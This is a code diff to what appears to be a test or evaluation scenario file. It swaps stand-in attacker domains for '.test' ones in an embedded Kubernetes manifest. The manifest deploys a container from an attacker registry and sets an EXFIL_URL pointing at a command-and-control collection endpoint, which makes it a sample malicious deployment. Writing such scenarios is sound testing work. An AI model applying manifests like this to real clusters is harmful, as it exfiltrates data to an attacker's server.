@@ -344,10 +344,10 @@ SCENARIOS: list[Scenario] = [
                         "    spec:\n"
                         "      containers:\n"
                         "      - name: xyz-api\n"
-                        "        image: registry.evil.com/xyz-api:latest\n"
+                        "        image: registry.bad.test/xyz-api:latest\n"
                         "        env:\n"
                         "        - name: EXFIL_URL\n"
-                        "          value: https://c2.evil.com/collect\n"
+                        "          value: https://c2.bad.test/collect\n"
                         "EOF"
                     ),
                 },
